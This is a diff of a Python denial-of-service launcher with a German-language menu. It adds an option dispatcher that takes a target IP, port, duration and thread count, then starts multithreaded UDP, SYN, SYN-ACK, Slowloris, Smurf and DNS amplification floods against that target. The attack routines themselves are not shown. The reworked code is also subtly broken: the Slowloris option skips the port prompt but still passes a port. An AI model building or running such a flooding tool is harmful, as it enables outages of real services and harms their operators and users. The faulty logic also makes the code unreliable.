@@ -316,7 +316,7 @@ if __name__ == "__main__":
 
     while True:
         print("1 - UDP Flood")
-        print("2 - TCP Flood")
+        print("2 - TCP SYN-ACK Flood")
         print("3 - SYN Flood")
         print("4 - Slowloris Attack")
         print("5 - Smurf Attack")
@@ -324,48 +324,50 @@ if __name__ == "__main__":
         print("7 - Beenden")
         choice = input(" [ Wähle eine Option ] : ")
 
-        elif choice == "7":
+        if choice == "7":
             print("[INFO] Programm beendet.")
             sys.exit()
-    
-        elif choice == "7":
-            print("[INFO] Programm beendet.")
-            sys.exit()
-            
-        elif choice == "7":
-            print("[INFO] Programm beendet.")
-            sys.exit()
-            
-        elif choice == "7":
-            print("[INFO] Programm beendet.")
-            sys.exit()
-            
+
         if choice in ["1", "2", "3", "4", "5", "6"]:
             ip = input("Ziel-IP-Adresse: ")
-            port = int(input("Ziel-Port: "))
-            packet_size = int(input("Paketgröße in Bytes: "))
-            num_threads = int(input("Anzahl der Threads: "))
-
-            attack_function = {
-                "1": udp_flood,
-                "2": syn_ack_flood,
-                "3": syn_flood,
-                "4": slowloris,
-                "5": smurf_attack,
-                "6":send_dns_query,
-            }.get(choice)
+            if choice not in ["4", "5"]:  # Slowloris und Smurf brauchen keinen Port
+                port = int(input("Ziel-Port: "))
+            duration = int(input("Dauer des Angriffs (Sekunden): "))
+            threads = int(input("Anzahl der Threads: "))
 
             stop_event.clear()
-            threads = [
-                threading.Thread(target=attack_function, args=(ip, port, packet_size))
-                for _ in range(num_threads)
+
+            # Angriffsfunktionen den Optionen zuordnen
+            if choice == "1":
+                attack_function = udp_flood
+                args = (ip, port, 1024)  # UDP-Flood mit 1024 Bytes
+            elif choice == "2":
+                attack_function = syn_ack_flood
+                args = (ip, port, duration)
+            elif choice == "3":
+                attack_function = syn_flood
+                args = (ip, port, duration, threads)
+            elif choice == "4":
+                attack_function = slowloris
+                args = (ip, port)
+            elif choice == "5":
+                broadcast_ip = input("Broadcast-IP-Adresse (z. B. 192.168.1.255): ")
+                attack_function = smurf_attack
+                args = (ip, broadcast_ip, duration, threads)
+            elif choice == "6":
+                attack_function = dns_amplification_attack
+                args = (ip, duration, threads)
+
+            # Threads starten
+            attack_threads = [
+                threading.Thread(target=attack_function, args=args)
+                for _ in range(threads)
             ]
-            for thread in threads:
-                thread.daemon = True
+            for thread in attack_threads:
                 thread.start()
 
+            # Dashboard starten
             dashboard_thread = threading.Thread(target=dashboard)
-            dashboard_thread.daemon = True
             dashboard_thread.start()
 
             input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
